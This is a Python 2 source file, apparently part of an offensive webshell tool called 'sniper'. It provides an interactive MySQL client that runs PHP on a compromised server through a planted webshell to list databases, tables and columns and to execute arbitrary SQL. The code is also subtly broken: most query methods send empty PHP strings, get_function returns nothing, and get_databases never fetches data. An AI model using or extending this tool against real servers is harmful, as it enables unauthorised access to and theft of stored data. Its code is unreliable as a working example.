#!/usr/bin/env python
# encoding: utf-8

from core.log import Log
from core.utils.string_utils.list2string import list2string

import string

class Mysql():
    def __init__(self, webshell, ip, username, password):
        self.webshell = webshell
        self.ip = ip
        self.username = username
        self.password = password
        self.database = ""
        self.user = ""
        self.databases = []
        self.version = ""
        self.function = self.get_function(self.webshell)
        # TODO 判断函数类型
        self.connection_flag = self.check_connection(self.webshell)

    def check_connection(self, webshell):
        code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new mysqli($h,$u,$p);if(mysqli_connect_error()){echo mysqli_connect_error();}$c->close();" % (self.ip, self.username, self.password)
        result = webshell.php_code_exec(code)
        if result[0]:
            content = result[1]
            if content == "":
                return True
            else:
                Log.error("Error: %s" % (content))
                return False
        else:
            return False

    def get_function(self, webshell):
        '''
        获取目标服务器支持的数据库链接函数
        '''
        functions = ["mysql_connect", "mysqli_connect"]
        for f in functions:
            if webshell.check_function_exist(f):
                self.function = f
                break

    def get_currect_database(self):
        if self.database != "":
            Log.success(self.database)
            return
        result = self.webshell.php_code_exec("");
        if result[0]:
            content = result[1]
            database = content
            self.database = database
            Log.success(database)
        else:
            Log.error("Error occured!")

    def get_currect_user(self):
        if self.user != "":
            Log.success(self.user)
            return
        result = self.webshell.php_code_exec("");
        if result[0]:
            content = result[1]
            user = content
            self.user = user
            Log.success(user)
        else:
            Log.error("Error occured!")

    def get_version(self):
        if self.version != "":
            Log.success(self.version)
            return
        result = self.webshell.php_code_exec("");
        if result[0]:
            content = result[1]
            version = content
            self.version = version
            Log.success(version)
        else:
            Log.error("Error occured!")

    def get_databases(self):
        if self.databases != None:
            Log.success(list2string(self.databases, "\t", "\n"))
            return
        result = self.webshell.php_code_exec("");
        if result[0]:
            content = result[1]
            databases = content.split(",")
            self.databases = databases
            Log.success(list2string(databases, "\t", "\n"))
        else:
            Log.error("Error occured!")

    def get_table_from_database(self, database):
        result = self.webshell.php_code_exec("");
        if result[0]:
            content = result[1]
            tables = content.split(",")
            Log.success(list2string(tables, "\t", "\n"))
        else:
            Log.error("Error occured!")

    def get_columns_from_table(self, tablename, database):
        result = self.webshell.php_code_exec("");
        if result[0]:
            content = result[1]
            columns = content.split(",")
            Log.success(list2string(columns, "\t", "\n"))
        else:
            Log.error("Error occured!")

    def sql_exec(self, sql):
        result = self.webshell.php_code_exec("");
        if result[0]:
            content = result[1]
            Log.success(content)
        else:
            Log.error("Error occured!")

    def help(self):
        print "Commands : "
        print "        0. [h] : show this help"
        print "        1. [cd] : get currect database"
        print "        2. [u] : get currect user"
        print "        3. [v] : get currect version"
        print "        4. [d] : get all databases"
        print "        5. [t] : get all tables of a database"
        print "        6. [c] : get all columns of a table"
        print "        7. [e] : execute a sql query"
        print "        8. [q] : quit"

    def interactive(self):
        self.help()
        while True:
            Log.context("sniper")
            Log.context("mysql")
            command = string.lower(raw_input("=>") or "h")
            if command == "h":
                self.help()
            elif command == "cd":
                self.get_currect_database()
            elif command == "u":
                self.get_currect_user()
            elif command == "v":
                self.get_version()
            elif command == "d":
                self.get_databases()
            elif command == "t":
                database = self.database
                if database == "":
                    database = raw_input("Input database name : ")
                if database == "":
                    Log.error("No database selected! Please input : [cd] command!")
                self.get_table_from_database(database)
            elif command == "c":
                database = self.database
                if database == "":
                    database = raw_input("Input database name : ")
                if database == "":
                    Log.error("No database selected! Please input : [cd] command!")
                    continue
                table = raw_input("Input table name : ")
                if table == "":
                    Log.error("No tablename inputed!")
                    continue
                self.get_columns_from_table(table, database)
            elif command == "e":
                sql = raw_input("Input your sql : ") or "select @@version;"
                Log.info("Executing sql : [%s]" % (sql))
                self.sql_exec(sql)
            elif command == "q":
                Log.info("Quiting...")
                break
            else:
                Log.error("Unsupported command!")
                self.help()
